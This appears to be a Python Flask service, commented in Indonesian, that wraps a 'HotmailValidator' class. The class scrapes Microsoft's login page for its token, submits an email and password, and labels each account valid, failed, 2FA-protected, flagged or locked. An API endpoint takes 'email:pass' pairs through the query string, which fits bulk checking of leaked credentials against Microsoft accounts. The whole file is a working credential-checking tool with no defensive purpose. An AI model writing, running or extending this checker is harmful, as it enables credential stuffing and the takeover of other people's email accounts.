import os
import requests
import re
import urllib.parse
from flask import Flask, request, jsonify

# Inisialisasi Aplikasi Flask
app = Flask(__name__)

# Kelas HotmailValidator (Tidak ada perubahan)
class HotmailValidator:
    def __init__(self, email, password):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
        })
        self.email = email
        self.password = password
        self.email_encoded = urllib.parse.quote(email)
        self.password_encoded = urllib.parse.quote(password)

    def validate_account(self):
        try:
            response_initial = self.session.get("https://login.live.com", allow_redirects=True, timeout=15)
            ppft_match = re.search(r'name="PPFT".*?value="([^"]*)"', response_initial.text)
            post_url_match = re.search(r'urlPost:\'([^\']*)', response_initial.text)

            if not ppft_match or not post_url_match: return 'RETRY_ERROR'
            
            ppft_encoded = urllib.parse.quote(ppft_match.group(1))
            login_url = post_url_match.group(1)
            
            login_payload = f"i13=0&login={self.email_encoded}&loginfmt={self.email_encoded}&type=11&LoginOptions=3&passwd={self.password_encoded}&PPFT={ppft_encoded}&PPSX=Pa&NewUser=1"
            
            self.session.headers.update({'Origin': 'https://login.live.com', 'Referer': login_url})
            response_login = self.session.post(login_url, data=login_payload, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            
            response_text_lower = response_login.text.lower()
            cookies_lower = str(self.session.cookies).lower()
            
            failure_keys = ["that microsoft account doesn't exist", "your account or password is incorrect", "you've tried to sign in too many times", "incorrect account or password"]
            unusual_activity_keys = ["help us secure your account", "unusual activity"]
            abuse_keys = ["identity/confirm", "abuse?mkt", "recover?mkt"]
            two_fa_keys = ["/cancel?mkt=", "',cw:true", "email/confirm?mkt"]
            valid_cookie_keys = ['wlssc', '__host-msaauth']

            if any(k in response_text_lower for k in failure_keys): return 'FAILED'
            if any(k in response_text_lower for k in unusual_activity_keys): return 'UNUSUAL_ACTIVITY'
            if any(k in response_text_lower for k in abuse_keys): return 'ABUSE'
            if any(k in response_text_lower for k in two_fa_keys): return '2FA_PROTECTED'
            if any(k in cookies_lower for k in valid_cookie_keys): return 'VALID'
            
            return 'RETRY_ERROR'
        except requests.exceptions.RequestException:
            return 'NETWORK_ERROR'
        except Exception:
            return 'RETRY_ERROR'

# Endpoint API Utama
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if path != "asu":
        return jsonify({"error": "Invalid endpoint. Use /asu"}), 404

    # Ambil query string mentah (contoh: b'?=email:pass')
    query_string = request.query_string.decode('utf-8')
    
    # Periksa dan ekstrak data 'email:pass'
    if not query_string.startswith('='):
        return jsonify({"error": "Invalid query format. Expected ?=email:pass"}), 400
    try:
        data_part = query_string.split('=', 1)[1]
        email, password = data_part.split(':', 1)
    except (IndexError, ValueError):
        return jsonify({"error": "Invalid data format. Expected email:pass"}), 400

    # Jalankan validator dan kembalikan hasilnya
    validator = HotmailValidator(email, password)
    status = validator.validate_account()
    return jsonify({"email": email, "status": status})

